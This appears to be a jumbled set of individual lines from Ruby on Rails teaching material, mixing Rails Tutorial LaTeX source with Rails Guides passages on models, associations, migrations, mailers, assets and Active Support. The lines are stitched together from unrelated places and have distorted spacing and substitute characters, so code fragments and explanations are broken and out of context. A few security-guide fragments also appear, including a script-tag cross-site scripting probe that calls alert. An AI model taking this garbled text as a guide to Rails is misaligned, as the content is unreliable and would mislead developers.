Finally , add a &apos; Destroy &apos; link to your `index` action template ╼ ( `app / views / articles / index ▖ html ▖ erb` ) to wrap everything together .
* `config ▖ after _ initialize` takes a block which will be run _ after _ Rails has finished initializing the application ▖
# &lt; Client id : 1 , first _ name : &quot; Lucas &quot; &gt; ,
The following configuration options are best made in one of the environment ╼ files ( environment ▖ rb , production ▖ rb , etc ▖ ▖ ▖ )
Of course , eventually the real user show page will look very different , and won &apos;t display the email address publicly .
Instead , the errors will propagate normally just like in other Active ╼ Record callbacks .
* `new ▖ html ▖ erb`
# # # # Changing Components
In Rails , the situation is different--- \ kode { StaticPagesController } is a Ruby class , but because it inherits from \ kode { ApplicationController } the behavior of its methods is specific to Rails : when visiting the URL / static \ _ pages / home , Rails looks in the Static Pages controller and executes the code in the \ kode { home } action , and then renders the \ emph { view } ( the V in MVC from Section ~ \ ref { sec : mvc } ) corresponding to the action .
Read about \ href { http : / / guides ▖ rubyonrails ▖ org / migrations ▖ html } { migrations in the Rails Guides } for more information .
10 types of people
Putting a copy of your Git repository at Bitbucket serves two purposes : it &apos;s a full backup of your code ( including the full history of commits ) , and it makes any future collaboration much easier .
Although there are many web browsers to choose from , the vast majority of Rails programmers use Firefox , Safari , or Chrome when developing .
For example , a stylesheet ╼ called `app / assets / stylesheets / projects ▖ css ▖ scss ▖ erb` is first processed as ERB , ╼ then SCSS , and finally served as CSS ▖ The same applies to a JavaScript file - ╼ `app / assets / javascripts / projects ▖ js ▖ coffee ▖ erb` is processed as ERB , then ╼ CoffeeScript , and served as JavaScript .
in Listing ~ \ ref { code : account _ activation _ edit _ action } .
The default locations are : the `images` , `javascripts` and `stylesheets` ╼ directories under the `app / assets` folder , but these subdirectories ╼ are not special - any path under `assets / * ` will be searched .
The Types of Associations
class CookiesController &lt; ApplicationController
By using a simple HTML property instead of inserting the full JavaScript code ( as in previous versions of Rails ) , Rails ~ 3 follows the philosophy of \ href { http : / / railscasts ▖ com / episodes / 205-unobtrusive-javascript } { \ emph { unobtrusive JavaScript } } .
This code looks nicer , but the title test is still a bit long .
The extremely simple doctype \ kode { &lt; ! DOCTYPE html &gt; } is characteristic of the latest HTML standard , HTML5 .
A model may find that option useful as a way to prevent mass-assignment from setting the attribute .
For example , by declaring that one model `belongs _ to` another , you instruct Rails to maintain Primary Key-Foreign Key information between instances of the two models , and you also get a number of utility methods added to your model ▖
To apply the changes in Listing ~ \ ref { code : seed _ users _ activated } , reset the database to reseed the data as usual :
Client ▖ find _ or _ create _ by ( first _ name : &apos; Andy &apos; )
* ` : destroy` causes all the associated objects to also be destroyed
Now make sure that the tests pass :
create config ▖ ru
in Listing ~ \ ref { code : failing _ validates _ name _ spec } .
The first timestamp ( ` &#91; timestamp _ 1 &#93; ` ) will be the current time , and the second ╼ timestamp ( ` &#91; timestamp _ 2 &#93; ` ) will be the current time plus a second ▖
The resulting demo app will allow us to interact with it through its URLs , giving us insight into the structure of a Rails application , including a first example of the \ emph { REST architecture } favored by Rails .
&#91; &quot; 6 &quot; , &quot; 7 &quot; , nil &#93;
# # # # `demodulize`
* `config ▖ action _ view ▖ prefix _ partial _ path _ with _ controller _ namespace` determines whether or not partials are looked up from a subdirectory in templates rendered from namespaced controllers ▖
Given that your remote branch is called `my _ pull _ request` , then you can do the ╼ following :
subject i18n ▖ t : subject
To secure the site properly , we also need access control on the \ kode { destroy } action , so our tests should check not only that admins \ emph { can } delete users , but also that other users \ emph { can &apos;t } .
When using the asset pipeline , paths to assets must be re-written and ╼ `sass-rails` provides `-url` and `-path` helpers ( hyphenated in Sass , ╼ underscored in Ruby ) for the following asset classes : image , font , video , audio , ╼ JavaScript and stylesheet .
Since we &apos;ll be using this sample app throughout the rest of the book , it &apos;s a good idea to \ href { https : / / github ▖ com / new } { make a new repository at GitHub } and push it up :
It does so by sending `to _ s` to them :
&lt; optgroup label = &quot; Africa &quot; &gt;
puts 60 ~ pixels of padding at the top of the page .
A mockup of the sample application &apos;s Home page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ page _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Given a default options hash , `with _ options` yields a proxy object to a block ▖
_ And what could an attacker do with a false redirection ?
# # # # `tableize`
To configure our application to use cloud storage in production , we &apos;ll use the \ texttt { fog } gem , as shown in Listing ~ \ ref { code : image _ uploader _ production } .
This means we can still undo the changes easily by having Git check out the previous commit with the \ kode { checkout } command ( and a \ kode { -f } flag to force overwriting the current changes ) :
This change stems from ╼ `ActiveSupport : : Callbacks` being largely rewritten for the 4 ▖ 1 release .
# # # # `stringify _ keys` and `stringify _ keys !
When the element with that CSS ~ id changes , the jQuery function fires and issues the \ kode { alert } method if the file is too big
111 ▖ 2345 ▖ to _ s ( : rounded ) # = &gt; 111 ▖ 235
For example , to find the definition of a function called \ kode { foo } , you can do a global search for ``def foo &apos; &apos; .
We can model a user having many microposts using the \ kode { has \ _ many } and \ kode { belongs \ _ to } methods in the User and Micropost models , respectively .
* Otherwise , an array with the argument as its single element is returned .
Naturally , Rails allows us to override the default , in this case using the \ kode { source } parameter ( as shown in Listing ~ \ ref { code : has _ many _ following _ through _ active _ relationships } ) , which explicitly tells Rails that the source of the \ kode { following } array is the set of \ kode { followed } ~ ids .
This guide covers Rails integration with Rack and interfacing with other Rack components .
-- create _ table ( : comments )
( If you are using a version of Ruby other than 2 ▖ 0 ▖ 0 , you should change the Ruby version line accordingly ▖ )
You should use `has _ many : through` if you need validations , callbacks , or extra attributes on the join model .
By default , if the delegation raises `NoMethodError` and the target is `nil` the exception is propagated ▖
Activating fixture users .
Now that we &apos;ve created the basic model , we &apos;ll add some validations to enforce the desired design constraints .
The method `change` allows you to get a new date which is the same as the receiver except for the given year , month , or day :
validates : email _ confirmation , presence : true
The main requirement is that enumerable objects must implement an \ kode { each } method to iterate through the collection .
To fix the error and get to \ passing , all we need to do is return \ kode { false } if the remember digest is \ kode { nil } , as shown in Listing ~ \ ref { code : authenticated _ p _ fixed } .
foreign _ key : &quot; patron _ id &quot;
We can then test for the right title using code like Listing ~ \ ref { code : layout _ links _ test _ signup _ full _ title _ helper } ( which extends the solution from the previous exercise ) .
has _ many : paragraphs
One interesting thing about this construction is that it was originally added to Ruby on Rails , and people liked it so much that it has now been incorporated into core Ruby .
╼ * Michael Hartl wrote this code .
Over the course of the next three chapters , we &apos;ll cover all of the other entries in Table ~ \ ref { table : RESTful _ users } as we fill in all the actions necessary to make Users a fully RESTful resource .
* `loop : true` , loops the video once it gets to the end .
The effect of this line is to look for a file called \ kode { app / views / layouts / \ _ shim ▖ html ▖ erb } , evaluate its contents , and insert the results into the view
FROM orders
query ▖ distinct ( false )
in Listing ~ \ ref { code : persistent _ sessions _ test } .
Note that the routes for signin and signout are custom , but the route for creating a session is simply the default ( i ▖ e ▖ , \ kode { &#91; resource name &#93; \ _ path } ) .
Our task in this section is to define the mailers and views with links containing the activation token and email address associated with the account to be activated .
&lt; p &gt;
You might have expected an instance of Array .
mount Blorgh : : Engine = &gt; &quot; / blorgh &quot;
The SQL that would be executed :
class CreatePictures &lt; ActiveRecord : : Migration
&lt; % = @ article ▖ text % &gt;
A current user &apos;s profile .
in Listing ~ \ ref { code : test _ helper _ log _ in } .
The combination will constitute a \ emph { Users resource } , which will allow us to think of users as objects that can be created , read , updated , and deleted through the web via the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Hypertext _ Transfer _ Protocol } { HTTP protocol } .
This application is used as a mounting point for the engine , ╼ to make testing the engine extremely simple ▖
We can do this by passing the \ kode { allow \ _ nil : true } option to \ kode { validates } , as seen in Listing ~ \ ref { code : allow _ blank _ password } .
Creating Active Record Models
orders ▖ clear
# # # # Rendering HTML
Now that we have made the controller and view , we need to tell Rails when we ╼ want &quot; Hello , Rails ! &quot; to show up ▖
At the time , we needed that method only in the Users controller , but now we find that we need it in the Microposts controller as well , so we &apos;ll move it into the Application controller , which is the base class of all controllers ( Section ~ \ ref { sec : a _ controller _ class } ) .
# Previously in Rails 4 ▖ 0
def session _ store = ( store )
&#91; 1 , 2 , 3 &#93; ▖ sum # = &gt; 6
╼ $ rake db : migrate
Add this at the ╼ bottom of the template :
In preparation for adding users to our site in Chapter ~ \ ref { cha : sign _ up } , the first \ kode { link \ _ to } creates a stub link of the form
address : &apos; smtp ▖ gmail ▖ com &apos; ,
* Rails 4 ▖ 0 encrypts the contents of cookie-based sessions if `secret _ key _ base` has been set ▖
# # # # Module Attributes
# # # # Implementing Decorator Pattern Using ActiveSupport : : Concern
The ╼ specific mailer view is known to the class because its name is the same as the ╼ mailer method ▖
( \ emph { Hint } : Your first step should be to \ emph { add } \ kode { admin } to the list of permitted parameters in \ kode { user \ _ params } ▖ )
In Chapter ~ \ ref { cha : log _ in _ log _ out } , we will complete our authentication machinery by allowing users to log in and out of the application .
* Rails 4 ▖ 0 changed how `assert _ generates` , `assert _ recognizes` , and `assert _ routing` work ▖
In database terms , this association says that this class contains the foreign key ▖
With the code in Listing ~ \ ref { code : users _ resource } , the routing works , but there &apos;s still no page there ( Figure ~ \ ref { fig : user _ show _ unknown _ action _ 4 } ) .
* ` : user _ name` - If your mail server requires authentication , set the username in this setting .
Content-Type : text / html ; charset = utf-8
Users of our demo app will have a unique \ kode { integer } identifier called \ kode { id } , a publicly viewable \ kode { name } ( of type \ kode { string } ) , and an \ kode { email } address ( also a \ kode { string } ) that will double as a username .
The heart of the signup page is a \ emph { form } for submitting the relevant signup information ( name , email , password , confirmation ) .
in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } .
Rails can render vanilla JavaScript :
# # # `validates _ each`
Migrations provide a way to alter the structure of the database incrementally , so that our data model can adapt to changing requirements .
This command will output this information :
&quot; rubies &quot; ▖ singularize # = &gt; &quot; ruby &quot;
Verify that the new sessions form renders properly .
This is also the case for ╼ `store _ accessors` based on top of `json` or `hstore` columns ▖
= &gt; &quot; 1 error &quot;
The resulting test , shown in Listing ~ \ ref { code : password _ reset _ integration _ test } , is an excellent exercise in reading code .
Sprockets does not add any new methods to access your assets - you still use the ╼ familiar `javascript _ include _ tag` and `stylesheet _ link _ tag` :
Let &apos;s see how this works .
It is useful for idioms like this :
We see here that the \ kode { empty ? } \ method , which we first saw in Section ~ \ ref { sec : objects _ and _ message _ passing } in the context of strings , also works on Rails error objects , returning \ kode { true } for an empty object and \ kode { false } otherwise .
def initialize
Keep in mind that some web browsers or proxy servers will cache this type of redirect , making the old page inaccessible .
The user show page after adding a Users resource .
Mime : : Type ▖ register &apos; application / json-patch + json &apos; , : json _ patch
╼ = &gt; &quot; the user &quot;
render action : &quot; edit &quot;
Rails includes a convenient way to build associations in fixtures , like this :
Assets inside subdirectories can also be accessed .
A ▖ x # = &gt; : a
Originally created by Tom Preston-Werner ( cofounder of \ href { http : / / github ▖ com / } { GitHub } ) and later acquired and scaled by \ href { http : / / automattic ▖ com / } { Automattic } ( the makers of \ href { http : / / wordpress ▖ com / } { WordPress } ) , Gravatar is a free service that allows users to upload images and associate them with email addresses they control .
Another proof-of-concept webmail worm is Nduja , a cross-domain worm for four Italian webmail services ▖
( ▖ ▖ ▖ )
# # # # Wrapping it up
First , add `gem &apos; web-console &apos; , &apos; ~ &gt; 2 ▖ 0 &apos; ` to the ` : development` group in your Gemfile and run `bundle install` ( it won &apos;t have been included when you upgraded Rails ) ▖
╼ $ rails generate model User name : string email : string
textColor = $ ( this ) ▖ data ( &quot; text-color &quot; )
# # # # Options for `belongs _ to`
The manifest file for app-specific CSS .
Generally speaking , it &apos;s a good idea for the development and production environments to match as closely as possible , which includes using the same database , but for the purposes of this tutorial we &apos;ll always use SQLite locally and PostgreSQL in production .
# # # `class _ eval ( * args , &amp; block ) `
The default is `ActionView : : Helpers : : FormBuilder` ▖
# # # Routing concerns
One example is the \ kode { to \ _ s } method that can convert virtually any object to a string :
The method `split` divides an array by a separator and returns the resulting chunks .
# &lt; id &gt; 4356 &lt; / id &gt;
Eager Loading Associations
You can add all the files ( apart from those that match the ignore patterns in \ kode { ▖ gitignore } ) as follows :
ubsection basic _ image _ upload ( end ) ╼ ╼ ╼ \ subsection { Image validation } % ( fold ) ╼ \ label { sec : image _ validation } ╼ ╼
Since a word \ emph { is a } string , it &apos;s more natural to have our \ kode { Word } class \ emph { inherit } from \ kode { String } , as seen in Listing ~ \ ref { code : word _ class } .
&lt; script &gt; alert ( &apos; Hello &apos; ) ; &lt; / script &gt;
`ids` can be used to pluck all the IDs for the relation using the table &apos;s primary key .
To tell Git you want to keep the changes , use the \ kode { commit } command :
f &quot; ) # = &gt; true
This is a hint that Rails follows the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Model-view-controller } { model-view-controller } ( MVC ) architectural pattern , which enforces a separation between ``domain logic &apos; &apos; ( also called ``business logic &apos; &apos; ) from the input and presentation logic associated with a graphical user interface ( GUI ) .
The default \ kode { Gemfile } in the \ kode { first \ _ app } directory .
Of course , we also want to validate the presence of email addresses .
The SQL that would be executed would be something like this :
$ bin / rails generate scaffold article title : string text : text
QUERY PLAN
Set to `true` by default in `development ▖ rb` .
# # # # Making Inline Attachments
# Remembers a user in the database for use in persistent sessions .
You may restrict the listing to the routes that map to a particular controller setting the `CONTROLLER` environment variable :
* `config ▖ active _ record ▖ schema _ format` controls the format for dumping the database schema to a file ▖
In Chapter ~ \ ref { cha : user _ microposts } and Chapter ~ \ ref { cha : following _ users } , we will use the association of users and microposts both to display all of a user &apos;s microposts and to construct a Twitter-like micropost feed .
GoodnessValidator ▖ new ( person ) ▖ validate
A mockup of the ``forgot password &apos; &apos; form .
# # # Cookies serializer
( Now you &apos;re in a position to understand the code in Listing ~ \ ref { code : digest _ method } , which uses the ternary operator to define the bcrypt \ kode { cost } variable ▖ )
in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ test } .
validates : bio , length : { maximum : 1000 ,
Try adding one step at a time , running
╼ &gt; &gt; x = 1
This mixing of the two string types is common in Ruby ; see Section ~ \ ref { sec : strings } for more information .
It also defines `Date ▖ yesterday` and `Date ▖ tomorrow` , and the instance predicates `past ? ` , `today ? ` , and `future ? ` , all of them relative to `Date ▖ current` .
In this section , we &apos;ll add \ emph { ordering } and \ emph { dependency } to microposts , while also testing that the \ kode { user ▖ microposts } method actually returns an array of microposts .
After :
* Two spaces , no tabs ( for indentation ) .
For ╼ example :
The method `in _ groups` splits an array into a certain number of groups ▖
The result appears in Listing ~ \ ref { code : user _ profile _ test }
A single entry in the routing file , such as :
The layout name ╼ needs to be the same as your mailer , such as `user _ mailer ▖ html ▖ erb` and ╼ `user _ mailer ▖ text ▖ erb` to be automatically recognized by your mailer as a ╼ layout .
Http only cookies can be used from IE v6 .
The \ emph { Rails Tutorial } takes an intuitive approach to testing that emphasizes the behavior of the application rather than its precise implementation , a variant of test-driven development ( TDD ) known as behavior-driven development ( BDD ) .
/ * footer * /
( Recall from Listing ~ \ ref { code : follow _ form _ partial } that this is a \ kode { div } that wraps the form , not the form itself ▖ )
Our primary purpose in this section is to render all the microposts for each user .
* `create _ association ( attributes = { } ) `
A red ( failing ) test ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / red _ failing _ spec _ 4 _ 0-full ▖ png } { ( full size ) }
class CreateArticles &lt; ActiveRecord : : Migration
These are the ╼ fields that Active Record will look for when you create associations between ╼ your models .
Considering various idiosyncratic customizations , there are probably as many development environments as there are Rails programmers .
We also include an \ emph { anchor } tag ~ \ kode { a } , which creates links to the given URL ( called an ``href &apos; &apos; , or ``hypertext reference &apos; &apos; , in the context of an anchor tag ) :
The Rails team is committed to not making any breaking changes to public API across releases without going through a full deprecation cycle ▖
class Template &lt; : : Tilt : : Template
To release the prompt and continue execution of the application , press Ctrl-D , then remove the \ kode { debugger } line from the \ kode { show } action ( Listing ~ \ ref { code : debugger _ removed } ) .
Exceptions and exception handling are somewhat advanced Ruby subjects , and we won &apos;t need them much in this book .
Extensions to `Enumerable`
X-Cache : HIT
The sample app with nicely styled logo .
Next , why does the \ kode { data-turbolinks-track } key / value pair use the old-style hashrocket syntax ?
Each nesting level will merge inherited defaults in addition to their own .
Currently , Active Record suppresses errors raised ╼ within `after _ rollback` or `after _ commit` callbacks and only prints them to ╼ the logs ▖
The view for the \ kode { help } action is analogous ( Listing ~ \ ref { code : raw _ help _ view } ) .
Adding the completed feed to the User model .
As noted briefly in Section ~ \ ref { sec : demo _ users _ resource } , this column is created automatically , and is used by Rails to identify each row uniquely .
Because this could easily happen in the normal course of using the application , such users will be forwarded to the login page with a helpful message , as mocked up in Figure ~ \ ref { fig : login _ page _ protected _ mockup } .
We can get the tests in Listing ~ \ ref { code : persistent _ sessions _ test } to pass by removing the \ kode { raise } and restoring the original \ kode { current \ _ user } method , as shown in Listing ~ \ ref { code : branch _ no _ raise } .
# # # Using partials to clean up duplication in views
Validating the presence of an \ kode { email } attribute ▖
In the present case , though , saying ``1 microposts &apos; &apos; is ungrammatical , so we arrange to display ``1 micropost &apos; &apos; and ``2 microposts &apos; &apos; using the \ kode { pluralize } method we saw in Section ~ \ ref { sec : signup _ error _ messages } .
The new methods are `qualified _ const _ defined ? ` , `qualified _ const _ get` , and ╼ `qualified _ const _ set` ▖
You can pass a collection of Active Record objects ▖
If you want to be sure that an association is present , you &apos;ll need to test ╼ whether the associated object itself is present , and not the foreign key used ╼ to map the association .
create mode 100644 README ▖ md
belongs _ to : supplier , inverse _ of : : account
# so we can safely require pry here
Adding a method for generating tokens .
ge as of Rails ~ 5 , and in previous versions of Rails the validations are required ▖ We &apos;ll plan to leave them in for completeness , but it &apos;s worth bearing in mind that you may see these validations omitted in other people &apos;s code ▖ ) ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-0003a9 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection relationship _ validations ( end ) ╼ ╼ \ subsection { Followed users } % ( fold ) ╼ \ label { sec : following } ╼ ╼
For simple class modifications , use `Class # class _ eval` ▖
While inheritance is a powerful idea , in the case of palindromes it might be even more natural to add the \ kode { palindrome ? } \ method to the \ kode { String } class itself , so that ( among other things ) we can call \ kode { palindrome ? } \ on a string literal , which we currently can &apos;t do :
Given a string with a qualified constant reference expression , `deconstantize` removes the rightmost segment , generally leaving the name of the constant &apos;s container :
The result is that the \ kode { full \ _ title } method is \ href { http : / / catb ▖ org / jargon / html / A / automagically ▖ html } { automagically } available in all our views .
To add an alternate new action using the ` : on` shortcut :
class CommentsController &lt; ApplicationController
# # # Applying a default scope
Now that we have a failing test , we &apos;re ready to implement friendly forwarding
# Change the path that assets are served from config ▖ assets ▖ prefix = &quot; / assets &quot;
The default is an empty string .
To avoid integration headaches later on , it &apos;s also a good idea to deploy the app to Heroku even at this early stage .
Our first step is to add Bootstrap , which in Rails applications can be accomplished with the \ texttt { bootstrap-sass } gem , as shown in Listing ~ \ ref { code : bootstrap _ sass } .
ActionView : : MissingTemplate :
Recall from Section ~ \ ref { sec : destroying _ users } that site administrators have the power to \ emph { destroy } users .
On subsequent login attempts , the forwarding URL should revert to the default ( i ▖ e ▖ , the profile page ) .
Having discussed how to store the user &apos;s remember token in a cookie for later use , we now need to learn how to retrieve the user on subsequent page views .
&#124; --------- &#124; ---------------- &#124; ----------------- &#124; -------------------------------------------- &#124;
TIP : If your application has many RESTful routes , using ` : only` and ` : except` to generate only the routes that you actually need can cut down on memory use and speed up the routing process .
as shown in Listing ~ \ ref { code : log _ out _ method } .
There are situations where you need to edit an email before it &apos;s ╼ delivered ▖
A relatively new , and unusual , form of entry points are banner advertisements ▖
Following the models from Listing ~ \ ref { code : default _ controller _ test } , you can probably guess the right test , which is shown in Listing ~ \ ref { code : about _ test } .
The association \ kode { count } method is smart , and performs the count directly in the database .
* FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; active&apos;
&lt; option value = &quot; 1 &quot; selected = &quot; selected &quot; &gt; David &lt; / option &gt;
# Generates a select field for minutes that defaults to the minutes for the time provided .
( Note that , in the context of Listing ~ \ ref { code : token _ digest _ self } and Listing ~ \ ref { code : token _ digest _ class _ self } , \ kode { self } is the \ kode { User } class , whereas the other uses of \ kode { self } in the User model refer to a user object \ emph { instance } .
These locations are explained in detail in the &#91; Asset Organization section in the Asset Pipeline Guide &#93; ( asset _ pipeline ▖ html # asset-organization )
as shown in Listing ~ \ ref { code : persistent _ sessions _ test } .
In what follows , each item includes a reference to a section or code listing with an example of the change in question .
as shown in Listing ~ \ ref { code : comment _ out _ failing _ tests } .
# # # Initializers
╼ ╼ \ subsection { Users controller } % ( fold ) ╼ \ label { sec : users _ controller } ╼ ╼
A summary of user / active relationship association methods .
SELECT clients .
# # # Error handling in transaction callbacks
# and goes back to the database
If you like , you may add additional routes that apply to the collection or individual members of the collection .
Regexp ▖ new ( &apos; ▖ &apos; , Regexp : : MULTILINE ) ▖ multiline ?
It &apos;s worth noting that the model in Figure ~ \ ref { fig : micropost _ model } uses the \ kode { text } data type for micropost content ( instead of \ kode { string } ) , which is capable of storing an arbitrary amount of text .
# Now in Rails 4 ▖ 1
In the process , we &apos;ll also have a chance to learn how to send email in Rails , both in development and in production .
select _ date ( Time ▖ today + 6 ▖ days )
Later in this guide you &apos;ll find out how to get edge Rails for testing .
In particular , we &apos;ll add an important feature to the production application to make signup secure , and we &apos;ll replace the default web server with one suitable for real-world use .
In the present case , these variables are configured automatically via the SendGrid add-on , but we &apos;ll see an example in Section ~ \ ref { sec : image _ upload _ in _ production } where we &apos;ll have to define them ourselves .
( Now that we have \ kode { is \ _ logged \ _ in ? } \ available in tests , we &apos;ve also thrown in a bonus \ kode { assert is \ _ logged \ _ in ? } \ immediately after posting valid information to the sessions path ▖ )
Typically , the messages that get passed to objects are \ emph { methods } , which are functions defined on those objects
The brand new User model .
Implementing this is the last bit of polish before letting users sign out .
To see your newly deployed application , visit the address that you saw when you ran \ kode { heroku create } ( i ▖ e ▖ , Listing ~ \ ref { code : heroku _ create } ) .
A mockup of a profile page with microposts ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ microposts _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Note that the password and confirmation in Listing ~ \ ref { code : successful _ edit _ test } are blank , which is convenient for users who don &apos;t want to update their passwords every time they update their names or email addresses .
} ╼ ╼ ╼ % subsection database _ migrations ( end ) ╼ ╼ \ subsection { The model file } % ( fold ) ╼ \ label { sec : the _ model _ file } ╼ ╼
as shown in Listing ~ \ ref { code : follow _ unfollow _ following } .
Security ╼ in your Rails application is covered in more depth in ╼ the &#91; Ruby on Rails Security Guide &#93; ( security ▖ html )
&#91; 1 , 2 , 3 &#93; ▖ in _ groups _ of ( 2 , 0 ) # = &gt; &#91; &#91; 1 , 2 &#93; , &#91; 3 , 0 &#93; &#93;
Client ▖ order ( created _ at : : desc )
Typically , this means assigning to variables that are initially \ kode { nil } , but note that \ kode { false } values will also be overwritten by the \ kode { &#124; &#124; = } operator .
resources : images , only : : index
You don &apos;t have to know what each class in this hierarchy does .
Above and ╼ beyond mass assignment issues , the method is often made `private` to make sure ╼ it can &apos;t be called outside its intended context .
You should also quit and restart the Rails development server .
if @ book ▖ nil ?
If you &apos;re using Git for version control , you should run the following command to checkout a topic branch for static pages :
By default , records are fetched in ascending order of the primary key , which must be an integer ▖
( If it doesn &apos;t work , be sure that JavaScript is enabled in your browser ; Rails uses JavaScript to issue the request needed to destroy a user ▖ )
For example , if your application includes customers and orders , and each order can be assigned to exactly one customer , you &apos;d declare the order model this way :
We &apos;ll learn in Section ~ \ ref { sec : slightly _ dynamic _ pages } what the \ kode { ▖ erb } part means ; from the \ kode { ▖ html } part you probably won &apos;t be surprised that it basically looks like HTML ( Listing ~ \ ref { code : raw _ home _ view } ) .
With the code in this section , the user edit page should be working ( Figure ~ \ ref { fig : edit _ form _ working } ) , as you can double-check by re-running the test suite , which should now be \ passing :
You can change this padding value using the second optional argument :
Let &apos;s start exploring strings with the console :
Test-driven development is useful when debugging by reproducing the bug in a test .
Code to display error messages on the signup form .
First , we &apos;ll add the \ emph { Faker } gem to the \ kode { Gemfile } , which will allow us to make sample users with semi-realistic names and email addresses ( Listing ~ \ ref { code : faker _ gemfile } ) .
render &quot; edit &quot;
Tests for valid email formats ▖
Because it &apos;s constructed using bcrypt , it is computationally impractical to use the digest to discover the original password
A test for a valid signup ▖
This list is presented for the convenience of those who read the 2nd edition ( or are otherwise familiar with Rails ~ 3 ▖ 2 ) and want a summary of the diffs .
There are four new links , two of which are stubbed out ( to be completed in Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } ) :
# # # Why Use Validations ?
The index view ( `app / views / users / index ▖ html ▖ erb` ) contains :
A test for an initially valid user ▖
Date ▖ new ( 2010 , 4 , 30 ) ▖ months _ ago ( 2 ) # = &gt; Sun , 28 Feb 2010
Active Support adds constant autoloading support to `load` .
= &gt; &quot; Example User &quot;
It will be recognized by the above sanitize ( ) filter , though ▖
def perform ( trashable , depth )
&lt; % = render &quot; menu &quot; % &gt;
This is the final step required to get the new comment form working ▖
&quot; InvoiceLine &quot; ▖ tableize # = &gt; &quot; invoice _ lines &quot;
Most browsers display the contents of the title tag at the top of the browser window ( Google Chrome is an odd exception ) , and it is also important for search-engine optimization .
The form needs to use a different URL in order to go somewhere else ▖ ╼
* First , to tell Mail to turn an attachment into an inline attachment , you just call ` # inline` on the attachments method within your Mailer :
It &apos;s that handoff that is the subject of this guide .
In fact , because this sort of construction is so useful , Active Record provides it by default :
Adding the \ kode { about } route ▖
So , for example , page ~ 1 is users 1--30 , page ~ 2 is users 31--60 , etc ▖ If \ kode { page } is \ kode { nil } , \ kode { paginate } simply returns the first page .
This book by Michael Hartl came so highly recommended that I had to try it , and the \ emph { Ruby on Rails Tutorial } is what I used to switch back to Rails again .
It is reasonable to ask why the user needs to leave that page at all .
The migration to add the data model from Figure ~ \ ref { fig : user _ model _ account _ activation } adds all three attributes at the command line :
This discussion will only make much sense if you have some experience with object-oriented programming ( OOP ) ; if you haven &apos;t studied OOP , feel free to skip this section .
&#124; DELETE &#124; / sekret / comments / : id ( ▖ : format ) &#124; comments # destroy &#124; comment _ path &#124;
The basic idea of the command line is simple : by issuing short commands , users can perform a large number of operations , such as creating directories ( \ texttt { mkdir } ) , moving and copying files ( \ texttt { mv } and \ texttt { cp } ) , and navigating the filesystem by changing directories ( \ texttt { cd } ) .
database : NOT _ my _ database
Here are some I particularly recommend :
belongs _ to : author , class _ name : &quot; User &quot;
Note that we &apos;ve used the \ emph { ordered list } tag ~ \ kode { ol } ( as opposed to an unordered list ~ \ kode { ul } ) because microposts are listed in a particular order ( reverse-chronological ) .
However if you must do this , you may use `where` as you would normally .
render json : @ product
Because these decorators are not referenced by your Rails application itself , ╼ Rails &apos; autoloading system will not kick in and load your decorators ▖
Layouts and Rendering in Rails
# # # Skipping Validations
belongs _ to : order , - &gt; { includes : customer }
As shown in Listing ~ \ ref { code : sendgrid _ config _ redux } , you will also have to define a \ kode { host } variable with the address of your production website .
* Sets cookies for the request .
╼ ╼ % subsubsection refactor ( end ) ╼ ╼ % subsection our _ first _ test ╼ ╼ % section getting _ started _ with _ testing ( end ) ╼ ╼ ╼ \ section { Slightly dynamic pages } % ( fold ) ╼ \ label { sec : slightly _ dynamic _ pages } ╼ ╼
In the case of the `blorgh` engine , making articles and comments ╼ have authors would make a lot of sense .
As noted in Section ~ \ ref { sec : resetting _ the _ password } , if we read \ kode { &lt; } as ``earlier than &apos; &apos; instead of ``less than &apos; &apos; , this code makes sense as the English sentence ``The password reset was sent earlier than two hours ago ▖ &apos; &apos;
assemblies ▖ size
Because \ kode { @ name } and \ kode { @ email } are both instance variables ( as indicated with the ~ \ kode { @ } sign ) , they are automatically available in the \ kode { formatted \ _ email } method .
For each user , implement an RSS feed for their microposts .
# # # Action Mailer
Action View has the ability render different templates depending on the current locale .
The test in Listing ~ \ ref { code : unsuccessful _ edit _ test } checks for the correct behavior by verifying that the edit template is rendered after getting the edit page and re-rendered upon submission of invalid information .
A \ kode { create } action for password resets .
With the code as in Listing ~ \ ref { code : password _ reset _ integration _ test } , our test suite should be \ passing :
The cloud IDE runs inside an ordinary web browser and hence works the same across different platforms , which is especially useful for operating systems ( such as Windows ) on which Rails development has historically been difficult .
hello &quot; ) # = &gt; true
Finally , ╼ we redirect the user to the `show` action , which we &apos;ll define later .
grade _ deployment ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : sign _ up _ conclusion } ╼ ╼ Being able to sign up users is a major milestone for our application .
create db / migrate / 20130307005528 _ create _ microposts ▖ rb
Rails uses HTTP status code 302 , a temporary redirect , when you call `redirect _ to` ▖
The predicate `in ? ` tests if an object is included in another object ▖
It is set by default by `sass-rails` ▖
The \ texttt { &#124; &#124; = } construction is very Rubyish---that is , it is highly characteristic of the Ruby language---and hence important to learn if you plan on doing much Ruby programming .
TIP : A symbol can represent a fully-qualified constant name as in ` : &quot; ActiveRecord : : Base &quot; ` , so the behavior for symbols is defined for convenience , not because it has to be that way technically .
C ▖ descendants # = &gt; &#91; B , A , D &#93;
```yaml
since , in the case of a \ kode { : followers } attribute , Rails will singularize ``followers &apos; &apos; and automatically look for the foreign key \ kode { follower \ _ id } in this case .
The test appears in Listing ~ \ ref { code : micropost _ interface _ test } .
`find _ by _ sql` has a close relative called `connection # select _ all` ▖ `select _ all` will retrieve objects from the database using custom SQL just like `find _ by _ sql` but will not instantiate them ▖
C : : X &quot; , false ) # = &gt; false
Tests for the Relationships controller authorization .
&#124; app / assets / javascripts / comment ▖ js ▖ coffee &#124; CoffeeScript for the controller &#124;
